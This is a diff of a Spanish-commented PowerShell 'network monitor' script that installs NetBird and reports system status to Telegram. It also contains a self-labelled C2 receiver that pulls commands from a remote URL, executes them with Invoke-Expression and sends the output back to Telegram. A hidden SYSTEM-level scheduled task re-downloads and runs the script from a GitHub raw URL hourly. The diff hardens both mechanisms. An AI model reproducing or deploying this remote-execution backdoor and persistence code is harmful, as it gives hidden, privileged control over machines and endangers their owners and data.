@@ -1,5 +1,5 @@
 # ===========================================================================
-# SCRIPT DE RED CONTICS 2026 - MONITOR + KEEP ALIVE + C2 PRO
+# SCRIPT DE RED CONTICS 2026 - MONITOR + KEEP ALIVE + C2 PRO (STABLE)
 # ===========================================================================
 
 # --- CONFIGURACION DE TELEGRAM ---
@@ -24,16 +24,16 @@ $nbPath = 'C:\Program Files\NetBird\netbird.exe'
 $PCName = $env:COMPUTERNAME
 
 # --- [PRO] RECEPTOR DE COMANDOS (C2) ---
-# Se ejecuta antes de la red para procesar ordenes pendientes
 if ($TareaUrl) {
     try {
-        $OrderRaw = (Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content
-        if ($null -ne $OrderRaw) {
-            $Order = $OrderRaw.Trim()
+        $resp = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
+        if ($null -ne $resp -and $resp.Content) {
+            $Order = $resp.Content.Trim()
             if ($Order -ne "NONE" -and $Order -ne "") {
                 Send-Telegram -Message "⚡ *ORDEN RECIBIDA:* $PCName`n*Cmd:* `$Order"
                 $Res = Invoke-Expression $Order 2>&1 | Out-String
-                Send-Telegram -Message "✅ *RESULTADO:*`n$Res"
+                $ResFinal = if ($Res) { $Res } else { "Ejecutado sin salida." }
+                Send-Telegram -Message "✅ *RESULTADO:*`n$ResFinal"
             }
         }
     } catch { }
@@ -43,7 +43,7 @@ Write-Host "`n======================================================" -Foregroun
 Write-Host "     SISTEMA DE RED CONTICS - OPTIMIZADO PRO" -ForegroundColor Cyan
 Write-Host "======================================================`n" -ForegroundColor Cyan
 
-# 1. Instalacion (Solo si no existe)
+# 1. Instalacion
 if (!(Test-Path $nbPath)) {
     Write-Host '[1/4] Instalando NetBird...' -ForegroundColor Yellow
     $installer = "$env:TEMP\nb.exe"
@@ -61,11 +61,11 @@ Write-Host '[2/4] Vinculando equipo...' -ForegroundColor Yellow
 if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
 Start-Sleep -Seconds 8 
 
-# --- [PRO] OBTENER SALUD DEL SISTEMA ---
+# --- [PRO] SALUD DEL SISTEMA ---
 try {
-    $DiskFree = (Get-PSDrive C).Free / 1GB
-    $RAMFree = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
-    $Salud = "`n*Disco:* {0:N2} GB libres`n*RAM:* {0:N0} MB libres" -f $DiskFree, $RAMFree
+    $df = (Get-PSDrive C).Free / 1GB
+    $rf = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
+    $Salud = "`n*Disco:* {0:N2} GB libres`n*RAM:* {0:N0} MB libres" -f $df, $rf
 } catch { $Salud = "" }
 
 # 4. Reporte e IP
@@ -80,28 +80,33 @@ if ($lineaIP) {
     $nbIP | clip
 }
 
-# 5. CONFIGURACION DE AUTO-RECONEXION + ACTUALIZACION (CADA 1 HORA)
+# 5. PERSISTENCIA (SIN CONFLICTO DE COMILLAS)
 Write-Host '[4/4] Configurando Tarea de Persistencia...' -ForegroundColor Yellow
 $TaskName = "Contics_KeepAlive"
 
-# Usamos comillas simples externas para evitar el error de terminador
-$ActionScript = 'powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr ''' + $GitHubRawUrl + ''' -UseBasicParsing)"'
+# Usamos una base64 o formato simple para evitar quiebre de comillas en la URL
+$InnerCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"
+$ActionScript = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $InnerCmd`""
 
-Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ActionScript`""
-$Trigger = New-ScheduledTaskTrigger -AtLogOn
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+try {
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ActionScript`""
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
 
-# Ajuste de intervalo a 1 hora
-$vTask = Get-ScheduledTask -TaskName $TaskName
-$vTask.Triggers[0].Repetition.Interval = "PT1H" 
-$vTask.Triggers[0].Repetition.Duration = "P365D"
-Set-ScheduledTask -InputObject $vTask | Out-Null
+    # Ajuste de intervalo
+    $vTask = Get-ScheduledTask -TaskName $TaskName
+    $vTask.Triggers[0].Repetition.Interval = "PT1H" 
+    $vTask.Triggers[0].Repetition.Duration = "P365D"
+    Set-ScheduledTask -InputObject $vTask | Out-Null
+    Write-Host " ✅ Todo listo." -ForegroundColor Green
+} catch {
+    Write-Host " ⚠️ Error en persistencia: $($_.Exception.Message)" -ForegroundColor Red
+}
 
-Write-Host " ✅ Todo listo." -ForegroundColor Green
 Write-Host '------------------------------------------------------' -ForegroundColor Cyan
 Write-Host "`nTerminado."
 Read-Host
